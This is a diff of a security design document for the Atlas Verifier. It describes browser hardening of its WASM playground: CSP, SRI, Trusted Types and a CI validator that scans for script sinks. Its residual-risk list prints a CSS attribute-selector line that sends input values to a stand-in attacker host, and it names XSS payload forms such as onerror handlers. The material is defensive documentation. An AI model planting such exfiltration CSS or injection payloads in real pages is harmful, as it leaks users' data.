@@ -1,6 +1,6 @@
-# Atlas Verifier — Defended Attack Surface (V1.15)
+# Atlas Verifier — Defended Attack Surface (V1.16)
 
-This document describes what the V1.15 verifier (`atlas-trust-core`, exposed as
+This document describes what the V1.16 verifier (`atlas-trust-core`, exposed as
 `atlas-verify-cli` and `atlas-verify-wasm`) actually defends against. It is
 written for auditors and security reviewers who want to know "what does this
 verifier protect, and where are the limits" without reading Rust.
@@ -1428,25 +1428,27 @@ runtime.
   npm registry availability is on the auditor's critical path for
   fresh installs. Vendoring or mirroring (e.g. to GitHub Packages)
   is out of scope for V1.14.
-- **Browser-runtime hardening of the playground.** The playground has
-  no CSP, no SRI on the WASM module, no service-worker pinning, no
-  client-side input-size cap on the trace/bundle file pickers. It is
-  meant as a local-dev "drop trace, click verify" reviewer
-  affordance against a known-trusted checkout, not a production
-  hosted tool. A future hosted playground (e.g.
-  `verify.atlas-trust.io`) would need full CSP + SRI + service-worker
-  caching + a JS-layer file-size cap (the Rust verifier already
-  enforces `MAX_ITEMS_PER_LEVEL = 10_000` as an allocation cap, but
-  the JS layer should gate before deserialising a multi-GB blob)
-  to defend against in-flight asset substitution and accidental tab
-  OOM from oversized fixtures.
-- **Browser SRI on the WASM module.** Subresource Integrity hashes
-  are not attached to the WASM binary in the playground because the
-  current deployment loads from `./pkg/` (relative, same origin,
-  local dev server) where SRI is structurally not applicable. If the
-  playground is ever served from a CDN, the served HTML must add an
-  `integrity` attribute on the WASM `fetch()` call (per the
-  `WebAssembly.compileStreaming` integrity-check spec).
+- **Browser-runtime hardening of the playground.** Page-side
+  hardening shipped as **V1.16 Welle A — see scope-d below**: strict
+  CSP via `<meta http-equiv>`, SRI on `app.js`, Trusted Types
+  enforcement (`require-trusted-types-for 'script'; trusted-types
+  'none'`), `X-Content-Type-Options: nosniff`, `Referrer-Policy:
+  no-referrer`. Service-worker pinning and a JS-layer file-size cap
+  (the Rust verifier already enforces `MAX_ITEMS_PER_LEVEL = 10_000`
+  as an allocation cap, but the JS layer could gate before
+  deserialising a multi-GB blob) remain deferred.
+- **Browser SRI on the WASM module itself.** Subresource Integrity
+  hashes are not attached to the `.wasm` binary in the playground
+  because the loader (`wasm-pack`-emitted `pkg/atlas_verify_wasm.js`)
+  drives the WASM fetch via `WebAssembly.instantiateStreaming` rather
+  than a `<script>`/`<link>` tag where SRI is declarative. The
+  `WebAssembly.compile` integrity-check spec (proposal stage) will
+  close this once browsers ship it; until then `app.js` is SRI-pinned
+  but the WASM binary is only protected by `script-src 'self'` +
+  `connect-src 'self'` (same-origin policy). A hosting deployment
+  that adds `Cache-Control: immutable` + `Content-Length` checks at
+  the CDN layer is the current best-practice mitigation; tracking
+  upstream as a V1.17+ Welle.
 
 ---
 
@@ -1705,15 +1707,230 @@ verifiable against either channel's bytes (same SHA, same commit SHA).
   [CONSUMER-RUNBOOK.md](CONSUMER-RUNBOOK.md). Welle B is the upload
   side; Welle C is the consumer side; together they close the V1.15
   distribution-resilience story end-to-end.
-- **Browser-runtime hardening.** The playground at
-  `apps/wasm-playground/` is unaffected by Welle B: it still loads
-  the local `wasm-pack` output via relative paths, with no CSP and
-  no SRI on the WASM module. See scope-e's "Browser SRI on the WASM
-  module" residual-risk entry for the deferred work.
+- **Browser-runtime hardening.** Page-side hardening shipped as
+  **V1.16 Welle A — see scope-d below**. WASM-binary SRI remains
+  deferred (loader-driven `WebAssembly.instantiateStreaming`,
+  declarative SRI not yet specced — see scope-e's "Browser SRI on
+  the WASM module itself" residual-risk entry).
 
 ---
 
-## Crate boundary
+## scope-d — Browser-runtime hardening of the WASM playground (V1.16 Welle A — shipped)
+
+The playground at `apps/wasm-playground/` (V1.14 Scope E) is a static
+HTML page that loads the verifier WASM module locally via `wasm-pack`'s
+emitted JS glue. V1.14 shipped it as a local-dev affordance: `wasm-pack
+build`, then `npx serve` or `python3 -m http.server` against the local
+checkout. V1.16 Welle A hardens it for any deployment beyond pure
+local-dev — a hosted playground (e.g. `playground.atlas-trust.dev`) can
+now resist injection attacks even when the surrounding network/CDN/proxy
+is partially compromised, without requiring server-side header config.
+
+**Trust property (no new property):** the playground hardening is pure
+defence-in-depth on the *delivery* of the verifier UI, not on the
+verifier's correctness. The WASM-side trust properties (byte-determinism
+pins, signature-integrity, hash-chain integrity, anchor verification)
+are unchanged. What V1.16 Welle A buys is *resistance to UI-side
+injection*: an attacker who manages to write to the served `index.html`
+or `app.js` cannot trivially inject inline `<script>`, `eval()`,
+`setTimeout("evil")`, `innerHTML = "<img onerror=…>"`, or arbitrary
+network egress against an active operator's browser session.
+
+### What scope-d covers
+
+1. **Strict CSP via `<meta http-equiv="Content-Security-Policy">`.** The
+   policy travels with the page bytes, so a static-hosting deployment
+   does not depend on the hosting provider sending the right
+   `Content-Security-Policy` HTTP header. (A correctly-configured host
+   SHOULD also send the header — `frame-ancestors` is meta-tag-ignored
+   in most browsers, only header-mode honours it. Defence-in-depth
+   either way.) Directives:
+   - `default-src 'none'` — every undeclared fetch directive denies by
+     default (img, font, media, object, frame, child, manifest, worker).
+   - `script-src 'self' 'wasm-unsafe-eval'` — same-origin scripts +
+     dynamic `import('./pkg/...')` + the dedicated WebAssembly
+     compilation keyword. Crucially does NOT include `'unsafe-inline'`
+     or `'unsafe-eval'`, so JavaScript `eval()` / `new Function()` /
+     inline `<script>...</script>` / `setTimeout("string")` /
+     `setInterval("string")` / `<a href="javascript:…">` are all
+     blocked.
+   - `style-src 'self' 'unsafe-inline'` — keep the small inline `<style>`
+     block in `index.html`. CSS-injection is a much lower-severity sink
+     than script-injection (no JS exec, no DOM API access); avoiding
+     `'unsafe-inline'` here would force a build step. Tradeoff
+     accepted; revisit if a build pipeline gets introduced.
+   - `connect-src 'self'` — only same-origin fetch / dynamic-import /
+     WebSocket egress.
+   - `form-action 'none'`, `frame-ancestors 'none'`, `base-uri 'none'`
+     — submission / clickjacking / base-anchor attacks blocked.
+   - `require-trusted-types-for 'script'` + `trusted-types 'none'` —
+     every script-related sink (`innerHTML`, `outerHTML`,
+     `document.write`, `setTimeout(string)`, setting `*.src` on script
+     elements, …) MUST receive a TrustedHTML/TrustedScriptURL value,
+     but no policy is allowed to mint one. The application is sink-free
+     by construction (`app.js` uses only `textContent`, `className`,
+     `style.display`), so any future regression that re-introduces a
+     sink fails at the browser boundary, not at code-review time. This
+     is the load-bearing TT setting for sink-free apps.
+
+2. **Subresource Integrity (sha384) on `app.js`.** The application code
+   was extracted from the inline `<script type="module">` in
+   `index.html` into a sibling `app.js` so the loading `<script>` tag
+   can carry an `integrity="sha384-…"` attribute. If the served bytes
+   of `app.js` don't match the pinned hash, the browser refuses to
+   execute the module. `crossorigin="anonymous"` is also set on the
+   tag — required for SRI to take effect on module scripts in some
+   browsers, and ensures no cookies are sent on the fetch.
+
+3. **`X-Content-Type-Options: nosniff`** + **`Referrer-Policy:
+   no-referrer`** via `<meta http-equiv>` — block MIME-sniffing on
+   script content (defence against attacker-served `<script src>`
+   pointing at a non-JS asset that the browser would otherwise sniff
+   as JS) and prevent referrer leakage on outbound resource fetches.
+
+4. **Anti-drift script `tools/playground-csp-check.sh`.** Pure-bash
+   validator (no Node/Python dependency) that:
+   - asserts the CSP meta-tag declares all required V1.16 Welle A
+     directives;
+   - asserts no `'unsafe-inline'` regression on `script-src` (style-src
+     is the documented exception);
+   - asserts no `'unsafe-eval'` regression (only `'wasm-unsafe-eval'`
+     is allowed);
+   - asserts the SRI hash on the `<script src="app.js">` tag matches
+     the actual sha384 of `apps/wasm-playground/app.js`;
+   - asserts `crossorigin="anonymous"` is present;
+   - audits `pkg/atlas_verify_wasm.js` (when present) for TT-protected
+     sinks (`eval`, `new Function`, `innerHTML`, `outerHTML`,
+     `document.write`, `insertAdjacentHTML`, `setTimeout(string)`,
+     `setInterval(string)`, `*.text =`) — closes the F-1 risk that
+     a future wasm-bindgen release silently introduces a sink that
+     would break the page under TT enforcement;
+   - emits a WARN (not a hard fail) on `frame-ancestors 'none'` to
+     remind the operator that meta-tag delivery is browser-ignored
+     for that directive, so CI green ≠ clickjacking-protected.
+
+   `--update-sri` flag re-pins the hash after a legitimate `app.js`
+   edit; pre-flight asserts an existing `integrity=` attribute is
+   present (refuses to "update" a tag that has no integrity attribute,
+   closing a silent-no-op false-positive PASS). Without flags, the
+   script exits non-zero on any drift — suitable for a CI step.
+
+5. **wasm-bindgen TT-compatibility baseline.** The pinned wasm-bindgen
+   version at the time of V1.16 Welle A is `0.2.118`. Empirical audit
+   of the emitted `pkg/atlas_verify_wasm.js` (run via
+   `tools/playground-csp-check.sh` after `wasm-pack build`) confirms
+   the `--target web` glue is TT-sink-free: it uses
+   `WebAssembly.instantiateStreaming` / `WebAssembly.instantiate` and
+   `fetch` (CSP-friendly under `script-src 'self' 'wasm-unsafe-eval'`
+   + `connect-src 'self'`) but contains no `eval`, no `new Function`,
+   no `innerHTML`/`outerHTML`/`document.write`, no `setTimeout`/
+   `setInterval` with string arguments, no `script.text` /
+   `script.src` assignments. Future wasm-bindgen upgrades MUST re-run
+   the validator to confirm continued TT-compat; the validator's
+   `pkg/` audit is the load-bearing pin.
+
+### What scope-d does NOT cover
+
+- **CSP violation reporting.** No `report-uri` / `report-to` /
+  `Reporting-Endpoints` is configured. Without a reporting endpoint,
+  CSP violations (XSS attempts, accidental sink introduction, mis-
+  configured cross-origin loads) are silent in production: the
+  browser blocks the violation but no operator sees the report.
+  For a hosted playground this is a meaningful blind spot — recommend
+  adding a `report-to` directive + a minimal collector endpoint as a
+  V1.16 Welle B / V1.17 candidate. Until then, manual smoke-tests
+  in DevTools are the only violation-detection surface.
+- **CSS data exfiltration via attribute selectors.** With `style-src
+  'self' 'unsafe-inline'`, an attacker who manages to inject CSS
+  (e.g. through a hypothetical future `<style>` tag injection that
+  bypasses sink discipline at the HTML level) can use attribute
+  selectors like `input[value^="abc"] { background-image:
+  url(//attacker.example/exfil); }` to leak the contents of input
+  fields character-by-character. The current playground has no
+  `<input type="text">` fields with sensitive values (only file
+  pickers, which don't expose `value` attributes), so the practical
+  residual risk is zero. Documented for future maintainers: if a
+  text-input field is ever added with sensitive data, this gap
+  becomes load-bearing and `style-src 'self' 'unsafe-inline'` must
+  be re-evaluated against a hash-CSP or external stylesheet
+  alternative.
+- **WASM-binary SRI.** The verifier `.wasm` blob is fetched by the
+  `wasm-pack`-emitted glue via `WebAssembly.instantiateStreaming`,
+  which has no declarative SRI hook. The
+  [`WebAssembly.compile` integrity-check spec](https://github.com/WebAssembly/spec/issues/1) is
+  proposal-stage; until browsers ship it, the WASM binary is protected
+  only by `script-src 'self'` + `connect-src 'self'` (same-origin
+  policy). For V1.17+, two paths are open: (a) wait for the spec,
+  (b) wrap the loader in a custom fetch that compares the SHA-256 of
+  the response bytes against a pinned hash before calling
+  `WebAssembly.compile`. Path (b) is implementable today but adds a
+  per-build hash-update friction we want to defer until there is an
+  active hosting deployment to justify it.
+- **Service-worker pinning.** A future hosted playground could ship a
+  service worker that intercepts all asset fetches and serves only the
+  pinned set (rejecting any unknown URL). Out of scope until a hosting
+  decision lands.
+- **JS-side input-size cap.** The Rust verifier already caps allocation
+  via `MAX_ITEMS_PER_LEVEL = 10_000` and rejects unknown fields, so a
+  multi-GB malicious blob fails the parse rather than running the
+  browser tab out of memory. A JS-layer pre-check (`File.size > N`
+  before `file.text()`) would short-circuit before the WASM call but
+  is cosmetic — the verifier itself does not need it for correctness.
+- **Server-side `Content-Security-Policy` HTTP header.** Out of scope
+  for the playground bytes themselves; a hosting deployment SHOULD
+  also send the same policy as a header to honour `frame-ancestors`.
+  Documented as an operator responsibility, not a code property.
+- **Hosting decision and DNS pinning.** scope-d is the *page-side*
+  hardening; *deployment-side* (where to host, how to pin DNS, who
+  controls the CDN, what `Cache-Control` headers to send, whether to
+  add CSP-Reporting-Endpoints) remains a downstream choice. Welle B
+  candidate territory.
+
+### Anti-drift
+
+- `tools/playground-csp-check.sh` (CI mode) re-asserts the CSP
+  directives, the `app.js` SRI hash, and the wasm-bindgen-glue
+  TT-compat audit on every run.
+- `apps/wasm-playground/app.js:1-19` documents the sink discipline
+  (`textContent`, `className`, `style.display` only). A reviewer
+  introducing `innerHTML` / `eval` / `new Function` / `setTimeout(str)`
+  / `*.src = userInput` should see this file header first.
+- `apps/wasm-playground/index.html:7-69` documents each CSP directive
+  inline so the policy is not a magic string.
+- **SRI foot-gun mitigation.** Editing `app.js` without re-running
+  `tools/playground-csp-check.sh --update-sri` produces a silent
+  page-load failure on the next browser visit (the new bytes don't
+  match the pinned hash, so the browser refuses to execute the
+  module). This is fail-loud at runtime (page shows the catch-block
+  error, console shows the SRI mismatch), but fail-silent at
+  edit-time. Operators editing the playground directly should add
+  a pre-commit hook running `tools/playground-csp-check.sh` to
+  catch the drift before push:
+  ```bash
+  # .git/hooks/pre-commit fragment
+  if git diff --cached --name-only | grep -q '^apps/wasm-playground/app\.js$'; then
+    bash tools/playground-csp-check.sh || exit 1
+  fi
+  ```
+  Not enforced project-wide because the playground edit path is
+  rare; CI on push is the second backstop.
+
+### Trust composition with V1.5 byte-determinism + V1.14 Scope E SLSA L3
+
+scope-d is delivery-side hardening. It composes with — does not replace
+— the existing trust roots:
+
+| Layer | What it pins | Failure mode addressed |
+|---|---|---|
+| V1.5 `signing_input_byte_determinism_pin` | CBOR signing-input bytes | issuer-side encoding drift |
+| V1.14 Scope E SLSA L3 OIDC provenance | npm tarball bytes ↔ Git commit | npm-registry compromise |
+| V1.15 Welle B GH-Releases backup | second tarball channel | npm-registry outage |
+| V1.15 Welle C consumer pinning | lockfile integrity hash | local install drift |
+| **V1.16 scope-d CSP + SRI + TT** | **playground `app.js` bytes + browser sink discipline** | **UI-side injection in a hosted deployment** |
+
+Each layer guards a different boundary; an attacker has to defeat all
+five to land a forged-trace-as-valid result against an operator using
+the playground.
 
 The verifier crates (`atlas-trust-core`, `atlas-verify-cli`,
 `atlas-verify-wasm`, `atlas-signer`) are licensed Apache-2.0. An auditor
